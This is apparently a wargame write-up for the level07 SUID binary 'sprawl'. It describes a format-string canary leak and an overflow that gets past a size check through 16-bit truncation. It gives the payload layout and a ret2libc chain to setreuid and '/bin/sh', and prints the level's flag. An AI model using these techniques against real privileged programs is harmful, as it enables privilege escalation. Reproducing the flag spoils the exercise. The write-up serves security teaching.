# level07 — walkthrough

**Binary:** `/home/level07/sprawl` (SUID `flag07`, x86-64) — **no source, reversed**
**Goal:** read `/home/flag07/.pass`

## 1. Recon
```
checksec: No PIE (0x400000), NX ON, stack canary, ASLR off.
main: print_banner(); route_tag(); process_packet(); dump_packets();
```

## 2. Two bugs
* **`route_tag`** — `fgets(buf,0x80); ...; printf(buf);` : format string. Used to
  leak the per-process **canary** (arg `%23$`).
* **`process_packet` / `read_header`** — `scanf("%x %hx %hx", &magic, &h4, &h6)`
  requires `magic == 0xdeadbeef`, then:
  ```c
  uint16_t product = (uint16_t)(h4 * h6);   // 16-bit truncation
  if (product > 0x40) reject;               // the size "check"
  fread(buf@rbp-0x50, 1, h4, stdin);        // count is h4, NOT product!
  ```
  The bounds check is on the truncated **product**, but `fread` uses **`h4`**
  alone. Set `h6 = 0` → product `0` (passes), while `h4` is any 16-bit value →
  `fread` overflows the buffer.

## 3. Exploit
1. `route_tag`: send `%23$p` → leak canary.
2. header: `deadbeef <count> 0` (magic ok, product = 0).
3. `fread` reads `count` bytes = the overflow:
   ```
   [ 'A'*72 ][ canary ][ 'A'*8 (saved rbp) ][ ret2libc chain ]
   ```
   (`buf` at `rbp-0x50`, canary at `rbp-0x8` → offset 72.)
4. chain: `setreuid(1024,1024)` + `system("/bin/sh")` (movaps-aligned), then the
   command is fed on stdin.

The leak and overflow happen in one process (subprocess) so the canary matches.

## 4. Run
```
python3 exploit.py
-> s3cgzrg5q78t6xx73ljvm3m2zfwk02ix
```

**flag07 = `s3cgzrg5q78t6xx73ljvm3m2zfwk02ix`** (SSH password for level08)
